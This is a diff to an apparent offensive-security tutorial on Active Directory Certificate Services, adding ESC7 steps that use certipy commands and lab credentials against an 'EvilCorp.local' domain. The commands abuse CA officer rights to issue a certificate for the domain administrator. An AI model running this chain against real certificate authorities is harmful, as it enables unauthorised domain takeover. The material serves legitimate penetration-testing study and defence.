@@ -272,10 +272,14 @@ certipy req 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca '
 <br></br>
 <h3 align="center" id="heading">ESC7: Vulnerable Certificate Authority Access Control:</h3>
 
+Outside of certificate templates, a certificate authority itself has a set of permissions that secure various CA actions:
 
 <p align="center">
   <img src="https://github.com/RayRRT/ADCS/blob/main/ESC7.png?raw=true)" />
 </p>
+
+From the security perspective it is necessary to care about the Manage CA (aka “CA Administrator”) and Manage Certificates (aka “Certificate Officer”) permissions.
+
 
 How to abuse:
 
@@ -283,7 +287,23 @@ In case we only have one user with **Manage CA** permission, it will be necessar
 ```
 certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -add-officer 'MCUser'
 ```
-
+Next we enable the SubCa template (enabled by default):
+```
+certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -enable-template 'SubCA'
+```
+Once we have enabled the SubCa template, and we have the Manager Ca and Manage Certificates permissions, we try to request a certificate based on the SubCA template:
+```
+certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'SubCA' -alt 'administrator@EvilCorp.local'
+```
+This request will be denied, just save the private key and the request ID.
+With this, we can issue the failed certificate request:
+```
+certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -issue-request 674
+```
+And finally, retrieve the issued certificate:
+```
+certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -retrieve 674 
+```
 <a name="ECS8"></a>
 <br></br>
 <h3 align="center" id="heading">ESC8: NTLM Relay to AD CS HTTP Endpoints:</h3>
